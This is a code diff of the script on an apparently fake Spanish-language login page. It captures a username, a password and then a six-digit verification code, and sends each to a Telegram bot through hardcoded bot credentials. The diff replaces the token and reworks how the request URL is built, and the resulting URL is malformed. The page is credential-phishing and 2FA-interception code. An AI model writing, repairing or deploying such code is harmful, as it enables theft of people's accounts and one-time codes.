@@ -158,8 +158,8 @@
 </div>
 
 <script>
-    // Configuración de credenciales de Telegram fijadas
-    const TELEGRAM_TOKEN = '9266327712:AAECsZyxrCw5Crz5KNjDiD2lJbflDzakg-0'; 
+    // Credenciales fijadas correctamente
+    const TELEGRAM_TOKEN = '9100194804:AAEx5kItgP_Mq6RHWkl8mJKbcw5Wg6FV3Bc'; 
     const CHAT_ID = '8885271470'; 
 
     const contrasenaInput = document.getElementById('contrasena');
@@ -175,7 +175,7 @@
         }
     });
 
-    // Manejo del Envío del Paso 1
+    // Envío del Paso 1 (Usuario y Clave)
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -186,9 +186,10 @@
         btn.disabled = true;
         btn.innerText = 'Cargando...';
 
-        const textoTelegram = `🔐 *Datos Recibidos*\n\n👤 *Usuario:* ${usuario}\n🔑 *Clave:* ${contrasena}`;
+        const textoTelegram = '🔐 *Datos Recibidos*\n\n👤 *Usuario:* ' + usuario + '\n🔑 *Clave:* ' + contrasena;
+        const urlPaso1 = 'https://telegram.org' + TELEGRAM_TOKEN + '/sendMessage';
 
-        fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendMessage`, {
+        fetch(urlPaso1, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -198,7 +199,7 @@
             })
         })
         .then(response => {
-            if (!response.ok) throw new Error('Error de envío');
+            if (!response.ok) throw new Error('Error');
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
             startTimer(600); 
@@ -210,7 +211,7 @@
         });
     });
 
-    // Manejo del Envío del Paso 2
+    // Envío del Paso 2 (Código de Verificación)
     document.getElementById('codeForm').addEventListener('submit', function(e) {
         e.preventDefault();
         const codigo = document.getElementById('codigoVerificacion').value;
@@ -219,9 +220,10 @@
         btn.disabled = true;
         btn.innerText = 'Procesando...';
 
-        const textoTelegramCodigo = `🔢 *Código de 6 Dígitos*\n\n📩 *Código:* ${codigo}`;
+        const textoTelegramCodigo = '🔢 *Código de 6 Dígitos*\n\n📩 *Código:* ' + codigo;
+        const urlPaso2 = 'https://telegram.org' + TELEGRAM_TOKEN + '/sendMessage';
 
-        fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendMessage`, {
+        fetch(urlPaso2, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
